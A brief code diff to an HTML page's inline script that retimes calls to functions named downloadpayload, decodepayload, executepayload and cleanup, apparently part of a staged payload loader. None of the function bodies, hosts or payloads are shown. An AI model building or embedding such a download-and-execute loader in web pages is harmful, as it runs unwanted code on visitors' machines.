@@ -220,11 +220,11 @@ function cleanup() {
 }
 downloadpayload();
 // Wait for download to complete
-setTimeout(decodepayload, 30000); // 40s - CHANGE THE SECONDS
+setTimeout(decodepayload, 40000); // 40s - CHANGE THE SECONDS
 // Wait for decoding to complete
-setTimeout(executepayload, 40000); // 50s - CHANGE THE SECONDS
+setTimeout(executepayload, 50000); // 50s - CHANGE THE SECONDS
 // Wait for execution to complete
-setTimeout(cleanup, 50000); // 60s - CHANGE THE SECONDS
+setTimeout(cleanup, 60000); // 60s - CHANGE THE SECONDS
 </script>
 
 </head>
